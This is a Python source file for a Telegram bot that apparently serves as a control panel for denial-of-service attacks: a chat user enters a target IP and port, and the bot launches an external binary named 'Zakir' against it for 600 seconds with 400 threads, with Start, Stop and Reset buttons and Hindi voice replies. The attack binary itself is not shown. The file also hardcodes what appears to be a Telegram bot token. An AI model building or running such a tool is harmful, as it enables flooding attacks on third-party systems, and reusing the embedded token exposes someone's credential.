import subprocess
import os
from gtts import gTTS
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters

# Path to your binary
BINARY_PATH = "./Zakir"

# Global variables
process = None
target_ip = None
target_port = None
attack_time = 600  # Default time
threads = 400  # Default thread count

# Function to generate and play voice response
def speak(text):
    tts = gTTS(text=text, lang="hi")
    tts.save("response.mp3")
    os.system("start response.mp3")  # Windows ke liye, Linux/macOS me "mpg321 response.mp3"

# Function to send text and voice reply together
async def send_reply(update: Update, text):
    await update.message.reply_text(text)
    speak(text)  # Auto voice reply

# Start command: Show Attack button
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("Attack")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    response_text = "Press the Attack button to start configuring the attack."

    await send_reply(update, response_text)

# Handle user input for IP and port
async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global target_ip, target_port
    try:
        target, port = update.message.text.split()
        target_ip = target
        target_port = int(port)

        keyboard = [
            [KeyboardButton("Start Attack"), KeyboardButton("Stop Attack")],
            [KeyboardButton("Reset")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        response_text = f"Target: {target_ip}, Port: {target_port}, Time: {attack_time} seconds, Threads: {threads} configured.\nNow choose an action:"

        await update.message.reply_text(response_text, reply_markup=reply_markup)
        speak(response_text)
    except ValueError:
        await send_reply(update, "Invalid format. Please enter in the format: <target> <port>")

# Start the attack
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port, attack_time, threads
    if not target_ip or not target_port:
        await send_reply(update, "Please configure the target and port first.")
        return

    if process and process.poll() is None:
        await send_reply(update, "Attack is already running.")
        return

    try:
        process = subprocess.Popen(
            [BINARY_PATH, target_ip, str(target_port), str(attack_time), str(threads)],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        await send_reply(update, f"Started attack on {target_ip}:{target_port} for {attack_time} seconds with {threads} threads.")
    except Exception as e:
        await send_reply(update, f"Error starting attack: {e}")

# Stop the attack
async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process
    if not process or process.poll() is not None:
        await send_reply(update, "No attack is currently running.")
        return

    process.terminate()
    process.wait()
    await send_reply(update, "Attack stopped.")

# Reset the attack
async def reset_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port
    if process and process.poll() is not None:
        process.terminate()
        process.wait()

    target_ip = None
    target_port = None
    await send_reply(update, "Attack reset. Please configure a new target and port.")

# Handle user actions for start/stop/reset
async def handle_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_text = update.message.text

    if user_text == "Start Attack":
        await start_attack(update, context)
    elif user_text == "Stop Attack":
        await stop_attack(update, context)
    elif user_text == "Reset":
        await reset_attack(update, context)
    else:
        await handle_input(update, context)

# Main function to start the bot
def main():
    TOKEN = "7533748861:AAF_m0GOXfuchvHNO002gahj4f_TWQjhxbM"

    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_action))

    application.run_polling()

if __name__ == "__main__":
    main()
